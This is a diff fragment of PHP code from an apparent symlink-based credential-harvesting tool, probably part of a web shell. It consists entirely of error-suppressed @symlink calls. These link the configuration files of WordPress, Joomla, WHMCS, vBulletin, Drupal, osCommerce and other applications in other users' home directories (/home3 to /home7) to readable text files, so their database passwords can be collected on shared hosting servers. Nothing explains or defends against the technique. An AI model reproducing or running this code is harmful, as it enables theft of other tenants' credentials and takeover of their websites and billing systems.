+@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
+@symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
+@symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
+@symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
+@symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
+@symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
+@symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
+@symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
+@symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
+@symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
+@symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
+@symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
+@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
+@symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
+@symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
+@symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
+@symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
+@symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
+@symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
+@symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
+@symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
+@symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
+@symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
+@symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
+@symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
+@symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
+@symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
+@symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
+@symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
+@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
+@symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
+@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
+@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
+@symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
+@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
+@symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
+@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
+@symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
+@symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
+@symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
+@symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
+@symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
+@symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
+@symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
+@symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
+@symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
+@symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
+@symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
+@symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
+@symlink('/home3/' . $user . '/public_html/db.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
+@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/admin/connect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/include/connect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/dbconnect.php', $user . '-normal');
+@symlink('/home3/' . $user . '/public_html/admin/connection.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
+@symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
+@symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
+@symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
+@symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
+@symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
+@symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
+@symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
+@symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
+@symlink('/home4/' . $user . '/public_html/library/config.php', $user . '-symlink');
+@symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
+@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
+@symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
+@symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
+@symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
+@symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
+@symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
+@symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
+@symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
+@symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
+@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
+@symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
+@symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
+@symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
+@symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
+@symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
+@symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
+@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
+@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
+@symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
+@symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
+@symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
+@symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
+@symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
+@symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
+@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
+@symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
+@symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
+@symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
+@symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
+@symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
+@symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
+@symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
+@symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
+@symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
+@symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
+@symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
+@symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
+@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
+@symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
+@symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
+@symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
+@symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
+@symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
+@symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
+@symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
+@symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
+@symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
+@symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
+@symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
+@symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
+@symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
+@symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
+@symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
+@symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
+@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
+@symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
+@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
+@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
+@symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
+@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
+@symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
+@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
+@symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
+@symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
+@symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
+@symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
+@symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
+@symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
+@symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
+@symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
+@symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
+@symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
+@symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
+@symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
+@symlink('/home4/' . $user . '/public_html/db.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
+@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/admin/connect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/include/connect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/dbconnect.php', $user . '-normal');
+@symlink('/home4/' . $user . '/public_html/admin/connection.php', $user . '-normal');
+@symlink('/home5/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
+@symlink('/home5/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home5/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
+@symlink('/home5/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
+@symlink('/home5/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
+@symlink('/home5/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
+@symlink('/home5/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
+@symlink('/home5/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
+@symlink('/home5/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
+@symlink('/home5/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
+@symlink('/home5/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
+@symlink('/home5/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
+@symlink('/home5/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
+@symlink('/home5/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
+@symlink('/home5/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
+@symlink('/home5/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
+@symlink('/home5/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
+@symlink('/home5/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
+@symlink('/home5/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
+@symlink('/home5/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
+@symlink('/home5/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
+@symlink('/home5/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
+@symlink('/home5/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
+@symlink('/home5/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
+@symlink('/home5/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
+@symlink('/home5/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
+@symlink('/home5/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
+@symlink('/home5/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
+@symlink('/home5/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
+@symlink('/home5/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
+@symlink('/home5/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
+@symlink('/home5/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
+@symlink('/home5/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
+@symlink('/home5/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
+@symlink('/home5/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
+@symlink('/home5/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
+@symlink('/home5/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
+@symlink('/home5/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
+@symlink('/home5/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
+@symlink('/home5/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
+@symlink('/home5/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
+@symlink('/home5/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
+@symlink('/home6/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
+@symlink('/home6/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home6/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
+@symlink('/home6/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
+@symlink('/home6/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
+@symlink('/home6/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
+@symlink('/home6/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
+@symlink('/home6/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
+@symlink('/home6/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
+@symlink('/home6/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
+@symlink('/home6/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
+@symlink('/home6/' . $user . '/public_html/wp-config.php', $user . '-Wordpress1.txt');
+@symlink('/home6/' . $user . '/public_html/blog/wp-config.php', $user . '-Wordpress2.txt');
+@symlink('/home6/' . $user . '/public_html/wp/wp-config.php', $user . '-Wordpress3.txt');
+@symlink('/home6/' . $user . '/public_html/home/wp-config.php', $user . '-Wordpress4.txt');
+@symlink('/home6/' . $user . '/public_html/main/wp-config.php', $user . '-Wordpress5.txt');
+@symlink('/home6/' . $user . '/public_html/site/wp-config.php', $user . '-Wordpress6.txt');
+@symlink('/home6/' . $user . '/public_html/configuration.php', $user . '-Joomla1.txt');
+@symlink('/home6/' . $user . '/public_html/blog/configuration.php', $user . '-Joomla2.txt');
+@symlink('/home6/' . $user . '/public_html/joomla/configuration.php', $user . '-Joomla3.txt');
+@symlink('/home6/' . $user . '/public_html/main/configuration.php', $user . '-Joomla4.txt');
+@symlink('/home6/' . $user . '/public_html/home/configuration.php', $user . '-Joomla5.txt');
+@symlink('/home6/' . $user . '/public_html/site/configuration.php', $user . '-Joomla6.txt');
+@symlink('/home6/' . $user . '/public_html/whm/configuration.php', $user . '-Whm1.txt');
+@symlink('/home6/' . $user . '/public_html/whmc/configuration.php', $user . '-Whm2.txt');
+@symlink('/home6/' . $user . '/public_html/support/configuration.php', $user . '-Whm3.txt');
+@symlink('/home6/' . $user . '/public_html/client/configuration.php', $user . '-Whm4.txt');
+@symlink('/home6/' . $user . '/public_html/billings/configuration.php', $user . '-Whm5.txt');
+@symlink('/home6/' . $user . '/public_html/billing/configuration.php', $user . '-Whm6.txt');
+@symlink('/home6/' . $user . '/public_html/clients/configuration.php', $user . '-Whm7.txt');
+@symlink('/home6/' . $user . '/public_html/whmcs/configuration.php', $user . '-Whm8.txt');
+@symlink('/home6/' . $user . '/public_html/order/configuration.php', $user . '-Whm9.txt');
+@symlink('/home6/' . $user . '/public_html/admin/conf.php', $user . '-Other1.txt');
+@symlink('/home6/' . $user . '/public_html/admin/config.php', $user . '-Other2.txt');
+@symlink('/home6/' . $user . '/public_html/conf_global.php', $user . '-invisio.txt');
+@symlink('/home6/' . $user . '/public_html/include/db.php', $user . '-Other3.txt');
+@symlink('/home6/' . $user . '/public_html/connect.php', $user . '-Other4.txt');
+@symlink('/home6/' . $user . '/public_html/mk_conf.php', $user . '-mk-portale1.txt');
+@symlink('/home6/' . $user . '/public_html/include/config.php', $user . '-Other5.txt');
+@symlink('/home6/' . $user . '/public_html/settings.php', $user . '-Smf.txt');
+@symlink('/home6/' . $user . '/public_html/includes/functions.php', $user . '-phpbb3.txt');
+@symlink('/home6/' . $user . '/public_html/include/db.php', $user . '-infinity.txt');
+@symlink('/home7/' . $user . '/public_html/inc/config.php', $user . '-MyBB.txt');
+@symlink('/home7/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
+@symlink('/home7/' . $user . '/public_html/includes/configure.php', $user . '-Oscommerce.txt');
+@symlink('/home7/' . $user . '/public_html/lib/config.php', $user . '-Balitbang.txt');
+@symlink('/home7/' . $user . '/public_html/config/koneksi.php', $user . '-Lokomedia.txt');
+@symlink('/home7/' . $user . '/public_html/vb/includes/config.php', $user . '-vBulletin1.txt');
+@symlink('/home7/' . $user . '/public_html/includes/config.php', $user . '-vBulletin2.txt');
+@symlink('/home7/' . $user . '/public_html/forum/includes/config.php', $user . '-vBulletin3.txt');
+@symlink('/home7/' . $user . '/public_html/cc/includes/config.php', $user . '-vBulletin4.txt');
+@symlink('/home7/' . $user . '/public_html/config.php', $user . '-Phpbb1.txt');
+@symlink('/home7/' . $user . '/public_html/forum/includes/config.php', $user . '-Phpbb2.txt');
